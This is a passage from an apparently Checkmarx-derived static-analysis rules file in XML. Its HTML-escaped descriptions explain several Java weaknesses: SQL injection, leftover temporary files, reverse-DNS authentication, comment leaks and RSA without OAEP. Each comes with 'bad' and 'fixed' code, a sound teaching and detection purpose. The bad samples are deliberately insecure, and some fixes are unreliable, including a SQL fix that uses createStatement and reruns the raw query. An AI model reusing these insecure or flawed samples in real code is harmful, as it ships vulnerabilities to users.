		ResultSet rs = stmt.executeQuery(query);
	}
}&lt;/pre&gt;&lt;h4&gt;The string obtained from the user is checked for potentially malicious characters&lt;/h4&gt;&lt;pre&gt;public class SQL_Injection_Fixed {
	public static void getUserId(Connection con) {
		System.out.println("enter user name");
		Scanner in = new Scanner(System.in);
		String user = in.nextLine();
		String query = "select user_id from User where user = ?";
		PreparedStatement stmt = con.createStatement(query);
		stmt.setString(1, user);
		ResultSet rs = stmt.executeQuery(query);
	}
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_608</key><name>Leaving_Temporary_File</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Applications often create temporary files containing sensitive business data or personal information, in order to handle the file generation process in&amp;nbsp;several steps, or even as the output of an automatic process. These files, if left exposed&amp;nbsp;on disk for an indeterminate period of time, could leak the secret data to unauthorized users.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;It is very common for applications to use temporary files, as intermediate storage and to aid with processing large amounts of data or long-running calculations. Applications require such files so frequently that most operating systems allocate a dedicated area for temporary files, such as a TEMP directory, and several different mechanisms for creating them exist in most platforms. However, by default these temporary files are not deleted automatically, and will remain on disk indefinitely. If the program does not explicitly and proactively delete the temporary files when it is finished processing them, they might be accessbile to other users of the computer.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ul&gt;
&lt;li&gt;Always explicitly delete any temporary file created. Ensure temp file deletion will occur by wrapping it in a &lt;code&gt;finally { }&lt;/code&gt; block, or call &lt;code&gt;File.deleteOnExit()&lt;/code&gt; to ensure eventual deletion.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Additionally, to ensure that all temporary files will eventually be deleted, consider implementing additional functionality that will periodically scrape and delete all unused, existing temporary files.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Ensure all existing file handles or references are closed before attempting deletion.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Leaving Temporary Report File&lt;/h4&gt;&lt;pre&gt;private byte[] generateData(int key) {
	File tempFile = File.createTempFile(TEMP_PREFIX, ".txt");   

  	FileOutputStream writer = new FileOutputStream(tempFile); 
  	ReportGenerator.writeHugeReportToFileStream(writer, key); 
  
  	FileInputStream reader = new FileInputStream(tempFile); 
  	int length = reader.available(); 
  	if (length &gt; 0) {
  		byte[] reportData = new byte[length];
		reader.read(reportData);
      
      	return reportData;
    }
  	else {
      	return null; 
    }
}&lt;/pre&gt;&lt;h4&gt;Cleaning Up Temporary Report File&lt;/h4&gt;&lt;pre&gt;private byte[] generateData(int key) {
  	byte[] reportData = null; 
  	File tempFile = null;
	FileOutputStream writer = null;
	FileInputStream reader = null;
	
  	try { 
      tempFile = File.createTempFile(TEMP_PREFIX, ".txt");

      writer = new FileOutputStream(tempFile); 
      ReportGenerator.writeHugeReportToFileStream(writer, key); 

      reader = new FileInputStream(tempFile); 
      int length = reader.available(); 
      if (length &gt; 0) {
		  reportData = new byte[length];
          reader.read(reportData);
      }
    }
  	catch (IOException e) {
      	handleError(e); 
    }
  	finally { 
		if (reader != null) {
          	try {
        		reader.close(); 
            }
      		catch (IOException e) {
      			handleError(e); 
    		}
        }
      
      	if (writer != null) {
          	try {
          		writer.close(); 
            }
            catch (IOException e) {
                handleError(e); 
            }
        }

      	if (tempFile != null) {
          	try { 
            	tempFile.delete(); 
            }
            catch (IOException e) {
                handleError(e); 
            }
        }
    }
  	return reportData;
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_2097</key><name>Reliance_on_DNS_Lookups_in_a_Decision</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Relying on reverse DNS records, without verifying domain ownership via cryptographic certificates or protocols, is not a sufficient authentication mechanism. Basing&amp;nbsp;any&amp;nbsp;security decisions on the registered hostname&amp;nbsp;could allow an external attacker to control the application flow. The attacker could possibly perform restricted operations, bypass access controls, and&amp;nbsp;even spoof the user's identity, inject a bogus hostname into the security log, and possibly other logic attacks.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;The application performs a reverse DNS resolution, based on the remote IP address, and performs a security check based on the returned hostname. However, it is relatively easy to spoof DNS names, or cause them to be misreported, depending on the context of the specific environment. If the remote server is controlled by the attacker, it can be configured to report a bogus hostname. Additionally, the attacker could also spoof the hostname if she controls the associated DNS server, or by attacking the legitimate DNS server, or by poisoning the server's DNS cache, or by modifying unprotected DNS traffic to the server. Regardless of the vector, a remote attacker can alter the detected network address, faking&amp;nbsp;the authentication details.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ul&gt;
&lt;li&gt;Do not rely on DNS records, network addresses, or system hostnames as a form of authentication, or any other security-related decision.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Do not perform reverse DNS resolution over an unprotected protocol without record validation.&lt;/li&gt;
&lt;li&gt;Implement a proper authentication mechanism, such as passwords, cryptographic certificates, or public key digital signatures.&lt;/li&gt;
&lt;li&gt;Consider using proposed protocol&amp;nbsp;extensions to cryptographically protect DNS, e.g. DNSSEC (though note the limited support and other drawbacks).&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Using Reverse DNS as Authentication&lt;/h4&gt;&lt;pre&gt;private boolean isInternalEmployee(ServletRequest req) {
  	boolean isCompany = false; 
  
	String ip = req.getRemoteAddr();
 	InetAddress address = InetAddress.getByName(ip);
  	
  	if (address.getHostName().endsWith(COMPANYNAME)) {
      	isCompany = true;
    }
  	return isCompany;
}&lt;/pre&gt;&lt;h4&gt;Verify Authenticated User's Identity&lt;/h4&gt;&lt;pre&gt;private boolean isInternalEmployee(ServletRequest req) {
  	boolean isCompany = false; 
  
	Principal user = req.getUserPrincipal();
  	if (user != null) {
    	if (user.getName().startsWith(COMPANYDOMAIN + "\\")) {
          	isCompany = true;
        }
    }
  	return isCompany;
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1644</key><name>Information_Leak_Through_Comments</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Information Leak Through Comments&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;615&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Variant)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Incomplete"&gt;Incomplete&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_615_Description" id="oc_615_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;While adding general comments is very useful, some programmers
tend to leave important data, such as: filenames related to the web application,
old links or links which were not meant to be browsed by users, old code
fragments, etc.&lt;/div&gt;
&lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;An attacker who finds these comments can map the application's structure
and files, expose hidden parts of the site, and study the fragments of code
to reverse engineer the application, which may help develop further attacks
against the site.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_615_Time of Introduction" id="oc_615_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_615_Demonstrative Examples" id="oc_615_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;The following comment, embedded in a JSP, will be displayed in the
resulting HTML output.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example Languages: &lt;/span&gt;HTML and JSP&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;&amp;lt;!-- FIXME: calling this with more than 30 args kills the
JDBC server --&amp;gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Observed Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Observed Examples&lt;/div&gt;&lt;div name="oc_615_Observed Examples" id="oc_615_Observed Examples" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Reference&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Description&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6197" target="_blank"&gt;CVE-2007-6197&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Version numbers and internal hostnames leaked in
HTML comments.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4072" target="_blank"&gt;CVE-2007-4072&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;CMS places full pathname of server in HTML
comment.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2431" target="_blank"&gt;CVE-2009-2431&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;blog software leaks real username in HTML
comment.&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_615_Potential Mitigations" id="oc_615_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Remove comments which have sensitive information about the
design/implementation of the application. Some of the comments may be
exposed to the user and affect the security posture of the
application.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_615_Relationships" id="oc_615_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;540&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=540" target="_blank"&gt;Information Leak Through Source Code&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_615_Content History" id="oc_615_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Anonymous Tool Vendor (under NDA)&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Sean Eidemiller&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;added/updated demonstrative
examples&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations,
Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-10-14&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-03-10&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Demonstrative Examples&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-07-27&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Observed Examples,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_2098</key><name>Use_of_RSA_Algorithm_without_OAEP</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Use of RSA Algorithm without OAEP&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;780&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Variant)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Incomplete"&gt;Incomplete&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_780_Description" id="oc_780_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The software uses the RSA algorithm but does not incorporate
Optimal Asymmetric Encryption Padding (OAEP), which might weaken the
encryption.&lt;/div&gt;
&lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;Padding schemes are often used with cryptographic algorithms to make the
plaintext less predictable and complicate attack efforts. The OAEP scheme is
often used with RSA to nullify the impact of predictable common text.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_780_Time of Introduction" id="oc_780_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Architecture and Design&lt;/li&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Common Consequences"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Common Consequences&lt;/div&gt;&lt;div name="oc_780_Common Consequences" id="oc_780_Common Consequences" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Scope&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Effect&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Confidentiality&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;Without OAEP in RSA encryption, it will take less work for an attacker
to decrypt the data or to infer patterns from the ciphertext.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Likelihood of Exploit"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Likelihood of Exploit&lt;/div&gt;&lt;div name="oc_780_Likelihood of Exploit" id="oc_780_Likelihood of Exploit" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="indent"&gt;Medium&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_780_Demonstrative Examples" id="oc_780_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;The example below attempts to build an RSA cipher.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;Java&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;public Cipher getRSACipher() {&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;Cipher rsa = null;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;try {&lt;/div&gt;
&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;rsa =
javax.crypto.Cipher.getInstance("RSA/NONE/NoPadding");&lt;/div&gt;
&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;catch (java.security.NoSuchAlgorithmException e) {&lt;/div&gt;
&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;log("this should never happen", e);&lt;/div&gt;
&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;catch (javax.crypto.NoSuchPaddingException e) {&lt;/div&gt;
&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;log("this should never happen", e);&lt;/div&gt;
&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;return rsa;&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;While the previous code successfully creates an RSA cipher, the cipher
does not use padding. The following code creates an RSA cipher using
OAEP.&lt;/p&gt;&lt;div class="indent Good_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Good Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;Java&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;public Cipher getRSACipher() {&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;Cipher rsa = null;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;try {&lt;/div&gt;
&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;rsa =
javax.crypto.Cipher.getInstance("RSA/ECB/OAEPWithMD5AndMGF1Padding");&lt;/div&gt;
&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;catch (java.security.NoSuchAlgorithmException e) {&lt;/div&gt;
&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;log("this should never happen", e);&lt;/div&gt;
&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;catch (javax.crypto.NoSuchPaddingException e) {&lt;/div&gt;
&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;log("this should never happen", e);&lt;/div&gt;
&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;return rsa;&lt;/div&gt;
